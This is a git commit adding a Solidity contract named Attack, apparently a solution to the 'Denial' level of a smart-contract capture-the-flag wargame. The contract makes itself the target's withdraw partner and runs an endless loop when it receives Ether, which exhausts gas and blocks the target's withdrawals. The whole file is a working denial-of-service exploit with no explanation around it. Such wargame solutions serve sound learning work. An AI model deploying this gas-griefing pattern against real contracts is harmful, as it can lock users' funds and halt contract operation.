7d9a1fd39760153403e4dc89b8decc78398b1a32
0xgtim <99255480+timou0911@users.noreply.github.com>
2024-12-21 10:38:21 +0800

    Update Attack.sol

--- 20. Denial ★★★☆☆/Attack.sol
+++ 20. Denial ★★★☆☆/Attack.sol
@@ -2,3 +2,22 @@
 
 pragma solidity ^0.8.0;
 
+interface IDenial {
+    function setWithdrawPartner(address) external;
+    function withdraw() external;
+}
+
+contract Attack {
+    IDenial target;
+
+    constructor(address targetAddr) {
+        target = IDenial(targetAddr);
+        target.setWithdrawPartner(address(this));
+    }
+
+    receive() external payable {
+        while(true) {
+            
+        }
+    }
+}
